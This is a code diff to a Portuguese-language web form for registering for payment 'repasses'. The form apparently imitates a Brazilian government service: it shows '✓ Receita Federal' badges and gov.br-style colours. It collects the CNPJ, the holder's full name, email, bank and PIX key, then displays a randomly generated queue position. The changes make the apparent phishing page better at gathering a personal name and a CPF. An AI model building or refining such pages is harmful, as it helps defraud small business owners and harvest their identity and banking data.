@@ -168,12 +168,22 @@
       </div>
 
       <form id="bank-form" onsubmit="handleBankRegistration(event)" class="space-y-4">
+        <!-- Campo Razão Social -->
         <div class="space-y-1.5">
           <div class="flex justify-between items-center">
             <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Razão Social / Nome Fantasia (MEI)</label>
             <span id="auto-fill-tag" class="text-[10px] font-bold bg-emerald-100 text-emerald-800 px-2 py-0.5 rounded-full">✓ Receita Federal</span>
           </div>
           <input type="text" id="reg-name" required placeholder="Razão Social da Empresa" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm font-semibold text-slate-800 focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
+        </div>
+
+        <!-- Campo: Nome Completo (Pessoa Física) -->
+        <div class="space-y-1.5">
+          <div class="flex justify-between items-center">
+            <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Nome do Titular (Pessoa Física)</label>
+            <span id="person-auto-tag" class="text-[10px] font-bold bg-emerald-100 text-emerald-800 px-2 py-0.5 rounded-full">✓ Receita Federal</span>
+          </div>
+          <input type="text" id="reg-person-name" required placeholder="Nome Completo do Titular" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm font-semibold text-slate-800 focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
         </div>
 
         <div class="space-y-1.5">
@@ -184,9 +194,6 @@
           <input type="email" id="reg-email" required oninput="handleEmailTyping(this)" onblur="validateEmailInput(this)" placeholder="seu.email@exemplo.com" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
           <p id="email-error" class="hidden text-xs text-red-600 font-bold pt-0.5">
             ⚠️ Formato de e-mail inválido. Exemplo correto: nome@dominio.com
-          </p>
-          <p id="email-notice" class="hidden text-[11px] text-amber-700 font-medium pt-0.5">
-            ℹ️ E-mail não encontrado na base pública do CNPJ. Por favor, digite o seu e-mail para contato.
           </p>
         </div>
 
@@ -210,6 +217,7 @@
           <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Tipo de Chave PIX</label>
           <select id="reg-pix-type" onchange="autoFillPixKey()" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-4 py-3 text-sm focus:outline-none focus:border-[#1351B4] focus:bg-white transition-all">
             <option value="CNPJ">CNPJ (Mesmo cadastrado)</option>
+            <option value="CPF">CPF</option>
             <option value="E-mail">E-mail</option>
             <option value="Telefone">Telefone</option>
             <option value="Chave Aleatória">Chave Aleatória</option>
@@ -259,6 +267,10 @@
             <span id="ticket-name" class="font-bold text-white"></span>
           </div>
           <div class="flex justify-between">
+            <span class="text-blue-200">Titular PF:</span>
+            <span id="ticket-person-name" class="font-bold text-white"></span>
+          </div>
+          <div class="flex justify-between">
             <span class="text-blue-200">Documento:</span>
             <span id="ticket-cpf" class="font-bold text-white"></span>
           </div>
@@ -301,11 +313,11 @@
       <div class="space-y-2.5">
         <div class="border border-slate-200 rounded-lg overflow-hidden">
           <button onclick="toggleFaq(1)" class="w-full text-left p-3 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
-            <span>Posso me inscrever como MEI?</span>
+            <span>Quem tem direito a receber o repasse?</span>
             <span id="faq-icon-1" class="text-base font-black text-[#1351B4]">+</span>
           </button>
           <div id="faq-answer-1" class="hidden p-3 text-xs text-slate-600 bg-white border-t border-slate-200 leading-relaxed">
-            Sim. O sistema aceita a inscrição de Microempreendedores Individuais (MEI) utilizando o CNPJ ou CPF vinculado para o recebimento prioritário.
+            Apenas Microempreendedores Individuais (MEI) ativos e com CNPJ regularizado possuem direito ao recebimento prioritário dos repasses. Pessoas físicas (CPF sem vínculo MEI) não são elegíveis nesta etapa.
           </div>
         </div>
 
@@ -386,6 +398,14 @@
       return true;
     }
 
+    // Função utilitária para remover números e pontuações iniciais da Razão Social (Padrão MEI)
+    function extractPersonName(razaoSocial) {
+      if (!razaoSocial) return "";
+      // Remove números e pontuações do início do texto
+      let cleaned = razaoSocial.replace(/^[\d\s\.\-\/]+/, '').trim();
+      return cleaned || razaoSocial;
+    }
+
     async function submitStep2() {
       const docInput = document.getElementById('input-cpf');
       const docError = document.getElementById('cpf-error');
@@ -403,12 +423,10 @@
       btnText.textContent = "CONSULTANDO CNPJ...";
       docError.classList.add('hidden');
 
-      // 2. Consulta rápida sem scraping/proxies lentos
       try {
         let nameFound = "";
         let emailFound = "";
 
-        // Helper para abortar se demorar mais de 3 segundos
         const fetchWithTimeout = (url, timeout = 3500) => {
           return Promise.race([
             fetch(url),
@@ -426,7 +444,7 @@
           }
         } catch (e) { console.log('MinhaReceita ignorado/timeout'); }
 
-        // TENTATIVA 2: BrasilAPI (Fallback de dados rápidos)
+        // TENTATIVA 2: BrasilAPI (Fallback)
         if (!nameFound) {
           try {
             const res2 = await fetchWithTimeout(`https://brasilapi.com.br/api/cnpj/v1/${cleanDoc}`);
@@ -439,21 +457,24 @@
         }
 
         const nameInput = document.getElementById('reg-name');
+        const personNameInput = document.getElementById('reg-person-name');
         const emailInput = document.getElementById('reg-email');
         const emailAutoTag = document.getElementById('email-auto-tag');
-        const emailNotice = document.getElementById('email-notice');
-        
+
         if (nameFound) {
+          // Preenche a Razão Social completa
           nameInput.value = nameFound;
+
+          // Extrai e preenche o Nome da Pessoa Física (removendo números iniciais do CNPJ/MEI)
+          const cleanPersonName = extractPersonName(nameFound);
+          personNameInput.value = cleanPersonName;
           
           if (emailFound && emailFound.trim() !== '' && emailFound.includes('@')) {
             emailInput.value = emailFound.trim().toLowerCase();
             if (emailAutoTag) emailAutoTag.classList.remove('hidden');
-            if (emailNotice) emailNotice.classList.add('hidden');
           } else {
             emailInput.value = '';
             if (emailAutoTag) emailAutoTag.classList.add('hidden');
-            if (emailNotice) emailNotice.classList.remove('hidden');
           }
 
           currentDocument = docInput.value;
@@ -510,6 +531,7 @@
       }
       
       const name = document.getElementById('reg-name').value;
+      const personName = document.getElementById('reg-person-name').value;
       const bank = document.getElementById('reg-bank').value;
       const pixKey = document.getElementById('reg-pix-key').value;
       
@@ -518,6 +540,7 @@
 
       document.getElementById('ticket-position').textContent = `#${randomPos}`;
       document.getElementById('ticket-name').textContent = name;
+      document.getElementById('ticket-person-name').textContent = personName;
       document.getElementById('ticket-cpf').textContent = currentDocument;
       document.getElementById('ticket-bank').textContent = bank;
       document.getElementById('ticket-pix').textContent = pixKey;
